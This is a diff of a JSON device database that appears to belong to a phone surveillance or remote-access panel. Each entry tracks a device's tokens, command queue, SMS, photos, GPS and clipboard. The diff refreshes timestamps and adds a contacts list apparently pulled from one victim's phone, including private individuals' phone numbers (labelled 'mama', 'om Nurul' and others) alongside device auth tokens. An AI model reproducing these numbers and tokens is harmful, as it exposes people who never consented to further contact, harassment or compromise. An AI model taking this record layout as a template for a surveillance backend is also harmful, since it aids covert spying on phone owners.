@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777381447556,
+    "lastSeen": 1777381465506,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -13486,7 +13486,7 @@
     "deviceName": "HP-SIPAGANESA-9F2F",
     "ownerUsername": "ikiygasima",
     "token": "7f17444d03b5a9a44ba6ab92faf2b179",
-    "lastSeen": 1777381448504,
+    "lastSeen": 1777381466539,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T13:01:23.543Z",
@@ -13504,7 +13504,68 @@
     "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": true,
-    "contacts": [],
+    "contacts": [
+      {
+        "name": "Cek Bonus",
+        "phone": "*889#"
+      },
+      {
+        "name": "Cek Nomor",
+        "phone": "*808#"
+      },
+      {
+        "name": "Cek Pulsa",
+        "phone": "*888#"
+      },
+      {
+        "name": "Contact Center",
+        "phone": "188"
+      },
+      {
+        "name": "Data Transaksi",
+        "phone": "*887#"
+      },
+      {
+        "name": "Info Pelanggan",
+        "phone": "188"
+      },
+      {
+        "name": "Isi Pulsa",
+        "phone": "888"
+      },
+      {
+        "name": "NSP1212",
+        "phone": "1212"
+      },
+      {
+        "name": "TELKOMSEL",
+        "phone": "+62111"
+      },
+      {
+        "name": "awa",
+        "phone": "+626282152366339"
+      },
+      {
+        "name": "kaik joda",
+        "phone": "+6281250275105"
+      },
+      {
+        "name": "mama",
+        "phone": "+6282231670442"
+      },
+      {
+        "name": "myphonedate",
+        "phone": "1724675802852"
+      },
+      {
+        "name": "om Nurul",
+        "phone": "+6281268905766"
+      },
+      {
+        "name": "sipa",
+        "phone": "+6282348030539"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
